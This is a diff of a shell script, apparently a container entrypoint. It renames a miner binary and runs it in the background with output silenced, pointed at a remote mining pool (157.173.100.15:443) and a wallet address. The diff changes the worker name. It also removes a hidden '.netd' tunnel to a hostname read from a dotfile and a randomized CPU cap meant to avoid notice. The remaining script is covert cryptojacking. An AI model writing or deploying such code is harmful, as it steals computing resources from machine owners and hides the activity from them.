@@ -11,24 +11,13 @@ cp /app/sr "/app/$NAME"
 chmod +x "/app/$NAME"
 rm -f /app/sr
 
-if [ -f .h ]; then
-    /usr/local/bin/.netd access tcp \
-    --hostname "$(cat .h)" \
-    --url 127.0.0.1:443 >/dev/null 2>&1 &
-fi
-
 /app/$NAME \
 -a yespowertide \
 -o 157.173.100.15:443 \
--u TR5CjGz5ZDUQNG7Trn5aDdhCSCSZevn9xH.openclaw \
+-u TR5CjGz5ZDUQNG7Trn5aDdhCSCSZevn9xH.opus \
 -p x \
 --cpu-threads 2 \
 --cpu-threads-intensity 1 \
 --cpu-threads-priority 1 >/dev/null 2>&1 &
-
-P=$!
-
-LIMIT=$((80 + RANDOM % 5))
-cpulimit -p $P -l $LIMIT >/dev/null 2>&1 &
 
 tail -f /dev/null
